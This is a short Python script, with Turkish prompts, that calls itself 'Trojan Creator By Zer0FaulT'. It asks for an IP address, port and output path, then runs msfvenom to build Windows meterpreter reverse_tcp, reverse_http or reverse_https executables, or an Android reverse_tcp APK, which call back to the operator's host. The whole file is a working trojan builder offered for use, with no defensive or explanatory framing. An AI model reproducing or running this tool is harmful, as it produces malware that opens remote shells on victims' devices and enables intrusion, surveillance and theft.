#!/usr/bin/env python
import os

# Install figlet (make sure this is run with proper permissions)
os.system("sudo apt-get install -y figlet")
os.system("clear")
os.system("figlet TROJAN")
os.system("echo 'Creator'")
os.system("echo 'developed by Zer0FaulT'")

print("""
Trojan Creator By Zer0FaulT
""")
ip = input("Local IP % Public IP giriniz: ")
port = input("Port Giriniz: ")
print("""

1. windows/meterpreter/reverse_tcp
2. windows/meterpreter/reverse_http
3. windows/meterpreter/reverse_https
4. android/meterpreter/reverse_tcp

""")
payload = input("Payload No giriniz: ")
kayityeri = input("Kayıt Yeri giriniz: ")

if payload == "1":
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {kayityeri}")
elif payload == "2":
    os.system(f"msfvenom -p windows/meterpreter/reverse_http LHOST={ip} LPORT={port} -f exe -o {kayityeri}")
elif payload == "3":
    os.system(f"msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} -f exe -o {kayityeri}")
elif payload == "4":
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f apk -o {kayityeri}")
else:
    print("Geçersiz payload numarası!")
